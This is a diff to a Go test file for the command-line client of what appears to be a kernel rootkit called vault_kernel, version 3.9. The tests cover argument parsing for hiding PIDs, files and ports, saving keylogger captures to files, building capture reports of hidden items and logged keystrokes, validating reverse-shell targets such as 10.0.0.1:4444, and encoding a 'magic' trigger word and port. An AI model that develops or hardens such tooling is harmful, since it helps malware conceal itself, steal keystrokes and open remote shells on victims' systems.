@@ -2,6 +2,7 @@ package main
 
 import (
 	"encoding/json"
+	"os"
 	"strings"
 	"testing"
 
@@ -13,7 +14,7 @@ import (
 func TestMarshalStatsJSON(t *testing.T) {
 	raw := map[string]string{
 		"module":          "vault_kernel",
-		"version":         "3.8",
+		"version":         "3.9",
 		"hooks_installed": "7",
 		"hooks_planned":   "7",
 		"module_hidden":   "0",
@@ -41,7 +42,7 @@ func TestMarshalStatsJSON(t *testing.T) {
 			t.Errorf("%s should marshal as a number, got %T (%v)", k, out[k], out[k])
 		}
 	}
-	if out["module"] != "vault_kernel" || out["version"] != "3.8" {
+	if out["module"] != "vault_kernel" || out["version"] != "3.9" {
 		t.Errorf("string values mangled: module=%v version=%v", out["module"], out["version"])
 	}
 }
@@ -252,5 +253,341 @@ func TestFormatKeylogEvent(t *testing.T) {
 	// Content is never mangled by the formatter.
 	if got := formatKeylogEvent("my dir/with space.txt", "00:00:00", true, false); !strings.HasSuffix(got, "my dir/with space.txt") {
 		t.Errorf("content mangled: %q", got)
+	}
+}
+
+// v3.9: --output extends the keylog grammar. It takes exactly one FILE
+// operand, may appear once, composes with --follow/--timestamps, and a
+// missing operand is a usage error (same strictness as the interval).
+func TestParseKeylogArgsOutput(t *testing.T) {
+	// --output alone (one-shot) is valid: writes the buffer once.
+	opts, err := parseKeylogArgs([]string{"--output", "/tmp/k.log"})
+	if err != nil || opts.outputPath != "/tmp/k.log" || opts.follow {
+		t.Errorf("--output /tmp/k.log: got %+v, %v", opts, err)
+	}
+	// Anywhere in the grammar, composed with follow+timestamps.
+	opts, err = parseKeylogArgs([]string{"--follow", "--timestamps", "--output", "cap.log"})
+	if err != nil || !opts.follow || !opts.timestamps || opts.outputPath != "cap.log" {
+		t.Errorf("follow+ts+output: got %+v, %v", opts, err)
+	}
+	// Missing operand → usage error.
+	if _, err := parseKeylogArgs([]string{"--output"}); err == nil {
+		t.Errorf("--output without operand must error")
+	}
+	// Empty operand → usage error.
+	if _, err := parseKeylogArgs([]string{"--output", ""}); err == nil {
+		t.Errorf("--output '' must error")
+	}
+	// Second --output → usage error.
+	if _, err := parseKeylogArgs([]string{"--output", "a", "--output", "b"}); err == nil {
+		t.Errorf("double --output must error")
+	}
+}
+
+// parseCaptureArgs owns the `capture` grammar: capture [--out FILE],
+// --out exactly once with a required non-empty operand, anything else
+// is a usage error.
+func TestParseCaptureArgs(t *testing.T) {
+	// Bare capture → stdout.
+	if p, err := parseCaptureArgs(nil); err != nil || p != "" {
+		t.Errorf("no args: got (%q, %v), want (\"\", nil)", p, err)
+	}
+	// --out PATH.
+	if p, err := parseCaptureArgs([]string{"--out", "/tmp/e.json"}); err != nil || p != "/tmp/e.json" {
+		t.Errorf("--out: got (%q, %v)", p, err)
+	}
+	// Missing operand.
+	if _, err := parseCaptureArgs([]string{"--out"}); err == nil {
+		t.Errorf("--out without operand must error")
+	}
+	// Empty operand.
+	if _, err := parseCaptureArgs([]string{"--out", ""}); err == nil {
+		t.Errorf("--out '' must error")
+	}
+	// Duplicated flag.
+	if _, err := parseCaptureArgs([]string{"--out", "a", "--out", "b"}); err == nil {
+		t.Errorf("double --out must error")
+	}
+	// Unknown token.
+	if _, err := parseCaptureArgs([]string{"extra"}); err == nil {
+		t.Errorf("stray token must error")
+	}
+}
+
+// keylogSink is the --output persistence: append-only, flushed per
+// record, created 0600 because captures may contain keystrokes.
+func TestKeylogSink(t *testing.T) {
+	dir := t.TempDir()
+	path := dir + "/cap.log"
+
+	s, err := newKeylogSink(path)
+	if err != nil {
+		t.Fatalf("newKeylogSink: %v", err)
+	}
+	if err := s.writeRecord("\n[10:30:05] def\n"); err != nil {
+		t.Fatalf("writeRecord: %v", err)
+	}
+	if err := s.writeRecord("ghi\n"); err != nil {
+		t.Fatalf("writeRecord 2: %v", err)
+	}
+	s.close()
+
+	data, err := os.ReadFile(path)
+	if err != nil {
+		t.Fatalf("read back: %v", err)
+	}
+	if string(data) != "\n[10:30:05] def\nghi\n" {
+		t.Errorf("transcript mangled: %q", string(data))
+	}
+
+	// 0600 on creation — keystrokes are sensitive.
+	st, err := os.Stat(path)
+	if err != nil {
+		t.Fatalf("stat: %v", err)
+	}
+	if perm := st.Mode().Perm(); perm != 0600 {
+		t.Errorf("perm = %o, want 600", perm)
+	}
+
+	// Appending after reopen must not truncate (follow restarts).
+	s2, err := newKeylogSink(path)
+	if err != nil {
+		t.Fatalf("reopen: %v", err)
+	}
+	s2.writeRecord("more\n")
+	s2.close()
+	data, _ = os.ReadFile(path)
+	if !strings.HasSuffix(string(data), "ghi\nmore\n") {
+		t.Errorf("append semantics broken: %q", string(data))
+	}
+
+	// Unwritable path → clear error.
+	if _, err := newKeylogSink(dir + "/missing-dir/cap.log"); err == nil {
+		t.Errorf("unwritable path must error")
+	}
+}
+
+// buildCaptureReport assembles the 4th JSON document: envelope field
+// order is contractual (SCHEMAS.md), stats reuse the stats --json
+// numeric conversion, keylog text passes through verbatim.
+func TestBuildCaptureReport(t *testing.T) {
+	raw := map[string]string{
+		"module":          "vault_kernel",
+		"version":         "3.9",
+		"hooks_installed": "7",
+		"hooks_planned":   "7",
+		"module_hidden":   "0",
+		"hidden_files":    "1",
+		"hidden_pids":     "1",
+		"hidden_ports":    "1",
+		"keylog_bytes":    "7",
+		"uptime_s":        "42",
+	}
+	hidden := ioctl.HiddenList{
+		PIDs:  []int{1234},
+		Files: []string{"secret.txt"},
+		Ports: []int{8080},
+	}
+	rep := buildCaptureReport(raw, hidden, "hello", "2026-09-15T10:30:05Z", false, clientVersion)
+
+	if rep.Schema != jsonSchemaVersion {
+		t.Errorf("schema = %d, want %d", rep.Schema, jsonSchemaVersion)
+	}
+	if rep.CapturedAt != "2026-09-15T10:30:05Z" || rep.ClientVersion != clientVersion {
+		t.Errorf("envelope scalars mangled: %q %q", rep.CapturedAt, rep.ClientVersion)
+	}
+	if rep.ModuleInSysfs {
+		t.Errorf("module_in_sysfs = true, want false")
+	}
+	if rep.Stats["hooks_installed"].(int) != 7 || rep.Stats["version"] != "3.9" {
+		t.Errorf("stats conversion wrong: %v", rep.Stats)
+	}
+	if len(rep.Hidden.PIDs) != 1 || rep.Hidden.Files[0] != "secret.txt" {
+		t.Errorf("hidden mangled: %+v", rep.Hidden)
+	}
+	if rep.Keylog != "hello" {
+		t.Errorf("keylog text mangled: %q", rep.Keylog)
+	}
+
+	// The document must marshal with the contractual key order.
+	j, err := json.MarshalIndent(rep, "", "  ")
+	if err != nil {
+		t.Fatalf("marshal: %v", err)
+	}
+	order := []string{`"schema"`, `"captured_at"`, `"client_version"`,
+		`"module_in_sysfs"`, `"stats"`, `"hidden"`, `"keylog"`}
+	pos := 0
+	for _, k := range order {
+		idx := strings.Index(string(j)[pos:], k)
+		if idx < 0 {
+			t.Errorf("key %s missing or out of order in:\n%s", k, j)
+			continue
+		}
+		pos += idx
+	}
+}
+
+// v3.9 closes the systemic grammar gap: every simple command enforces
+// strictArgs (exactly `want` operands) and parseFlagOnly (the optional
+// flag alone). The audit found 15 of 20 dispatcher cases silently
+// swallowing excess arguments while the Python client rejected them.
+func TestStrictArgs(t *testing.T) {
+	// Exact match passes.
+	if err := strictArgs([]string{"a"}, 1, "usage"); err != nil {
+		t.Errorf("strictArgs(a,1): %v", err)
+	}
+	// Missing operand.
+	if err := strictArgs(nil, 1, "usage: x"); err == nil {
+		t.Errorf("strictArgs(nil,1) must error")
+	}
+	// Excess operand names the first unexpected one.
+	err := strictArgs([]string{"a", "b", "c"}, 1, "usage: x")
+	if err == nil || !strings.Contains(err.Error(), "unexpected argument: b") {
+		t.Errorf("strictArgs excess = %v, want unexpected 'b'", err)
+	}
+	// Zero-operand commands.
+	if err := strictArgs(nil, 0, "usage: x"); err != nil {
+		t.Errorf("strictArgs(nil,0): %v", err)
+	}
+	if err := strictArgs([]string{"extra"}, 0, "usage: x"); err == nil {
+		t.Errorf("strictArgs(extra,0) must error")
+	}
+}
+
+func TestParseFlagOnly(t *testing.T) {
+	// Bare command.
+	if ok, err := parseFlagOnly(nil, "--json", "usage"); ok || err != nil {
+		t.Errorf("no args: got (%v, %v)", ok, err)
+	}
+	// The flag once.
+	if ok, err := parseFlagOnly([]string{"--json"}, "--json", "usage"); !ok || err != nil {
+		t.Errorf("--json: got (%v, %v)", ok, err)
+	}
+	// Anything else is a usage error.
+	for _, bad := range [][]string{{"extra"}, {"--json", "extra"}, {"--bogus"}, {"--json", "--json"}} {
+		if ok, err := parseFlagOnly(bad, "--json", "usage"); ok || err == nil {
+			t.Errorf("parseFlagOnly(%v) = (%v, %v), want error", bad, ok, err)
+		}
+	}
+}
+
+// parsePIDArg (hide-pid/unhide-pid): numeric and >= 1. 0/negative PIDs
+// were accepted before v3.9 and stored verbatim in the hide-list.
+func TestParsePIDArg(t *testing.T) {
+	for _, ok := range []string{"1", "42", "1234"} {
+		if pid, err := parsePIDArg(ok); err != nil || pid != 42 && ok == "42" {
+			t.Errorf("parsePIDArg(%q) = (%d, %v)", ok, pid, err)
+		}
+	}
+	pid, err := parsePIDArg("42")
+	if err != nil || pid != 42 {
+		t.Errorf("parsePIDArg(42) = (%d, %v)", pid, err)
+	}
+	for _, bad := range []string{"0", "-5", "abc", "1.5", ""} {
+		if _, err := parsePIDArg(bad); err == nil {
+			t.Errorf("parsePIDArg(%q) must error", bad)
+		}
+	}
+	// The combined wrapper also enforces the one-operand grammar.
+	if _, err := parsePIDArgs([]string{"1", "2"}, "hide-pid"); err == nil {
+		t.Errorf("extra args must error")
+	}
+	if _, err := parsePIDArgs(nil, "hide-pid"); err == nil {
+		t.Errorf("missing pid must error")
+	}
+}
+
+// parsePortArgs / parsePortArg: the 1-65535 check, previously
+// duplicated inline three times, is one tested pure function.
+func TestParsePortArg(t *testing.T) {
+	if p, err := parsePortArg("8080"); err != nil || p != 8080 {
+		t.Errorf("parsePortArg(8080) = (%d, %v)", p, err)
+	}
+	for _, bad := range []string{"0", "-1", "65536", "abc", ""} {
+		if _, err := parsePortArg(bad); err == nil {
+			t.Errorf("parsePortArg(%q) must error", bad)
+		}
+	}
+	if _, err := parsePortArgs([]string{"80", "443"}, "hide-port"); err == nil {
+		t.Errorf("extra args must error")
+	}
+}
+
+// parseShellTarget: real ip:port validation. Before v3.9 the Go client
+// only required "contains :", so `abc:def` reached the kernel and died
+// with a raw EINVAL; the Python client validated nothing.
+func TestParseShellTarget(t *testing.T) {
+	valid := []string{"10.0.0.1:4444", "localhost:8080", "host-1:1", "203.0.113.9:65535"}
+	for _, v := range valid {
+		if err := parseShellTarget(v); err != nil {
+			t.Errorf("parseShellTarget(%q) = %v, want nil", v, err)
+		}
+	}
+	invalid := []string{
+		"",               // empty
+		"10.0.0.1",       // no colon
+		":4444",          // empty host
+		"10.0.0.1:",      // empty port
+		"abc:def",        // non-numeric port
+		"10.0.0.1:0",     // port < 1
+		"10.0.0.1:-5",    // negative port
+		"10.0.0.1:65536", // port > 65535
+		"10.0.0.1:44:44", // trailing colon-split fails port parse
+	}
+	for _, bad := range invalid {
+		if err := parseShellTarget(bad); err == nil {
+			t.Errorf("parseShellTarget(%q) must error", bad)
+		}
+	}
+}
+
+// parseWatchArgs owns the watch grammar: default 1000 ms, --interval
+// with a required >= 50 operand, extras rejected (before v3.9,
+// `watch --interval 500 extra` silently ignored "extra").
+func TestParseWatchArgs(t *testing.T) {
+	// Bare watch: default.
+	opts, err := parseWatchArgs(nil)
+	if err != nil || opts.intervalMs != watchDefaultIntervalMs {
+		t.Errorf("no args: got %+v, %v", opts, err)
+	}
+	// --interval MS.
+	opts, err = parseWatchArgs([]string{"--interval", "250"})
+	if err != nil || opts.intervalMs != 250 {
+		t.Errorf("--interval 250: got %+v, %v", opts, err)
+	}
+	// Errors: missing operand, non-numeric, below floor, unknown flag,
+	// stray positional.
+	for _, bad := range [][]string{
+		{"--interval"},
+		{"--interval", "abc"},
+		{"--interval", "10"},
+		{"--interval", "-5"},
+		{"extra"},
+		{"--interval", "500", "extra"},
+		{"--json"},
+	} {
+		if _, err := parseWatchArgs(bad); err == nil {
+			t.Errorf("parseWatchArgs(%v) must error", bad)
+		}
+	}
+}
+
+// parseMagicEncodeArgs: exactly word+port; extras were silently
+// ignored before v3.9.
+func TestParseMagicEncodeArgs(t *testing.T) {
+	word, port, err := parseMagicEncodeArgs([]string{"pwn", "4444"})
+	if err != nil || word != "pwn" || port != 4444 {
+		t.Errorf("magic-encode pwn 4444 = (%q, %d, %v)", word, port, err)
+	}
+	for _, bad := range [][]string{
+		{},
+		{"pwn"},
+		{"pwn", "4444", "extra"},
+		{"pwn", "0"},
+		{"pwn", "abc"},
+	} {
+		if _, _, err := parseMagicEncodeArgs(bad); err == nil {
+			t.Errorf("parseMagicEncodeArgs(%v) must error", bad)
+		}
 	}
 }
